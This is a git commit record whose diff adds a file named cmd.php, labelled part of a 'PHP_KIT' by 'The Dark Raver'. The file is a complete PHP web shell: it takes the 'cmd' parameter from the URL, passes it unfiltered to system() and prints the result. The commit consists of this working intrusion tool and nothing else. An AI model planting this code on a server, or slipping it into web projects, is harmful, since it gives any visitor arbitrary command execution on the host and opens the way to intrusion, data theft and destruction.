27feb58f7d62ba4c9adb6c902c6366f077a6ff93
ghostlulzbishop <46535025+ghostlulzbishop@users.noreply.github.com>
2019-10-15 12:57:21 -0400

    Add files via upload

---
+++ cmd.php
@@ -0,0 +1,18 @@
+<?
+//
+// PHP_KIT
+//
+// cmd.php = Command Execution
+//
+// by: The Dark Raver
+// modified: 21/01/2004
+//
+?>
+<pre>
+<?
+if($_GET['cmd']) {
+  system($_GET['cmd']);
+  }
+?>
+</pre>
+</BODY></HTML>
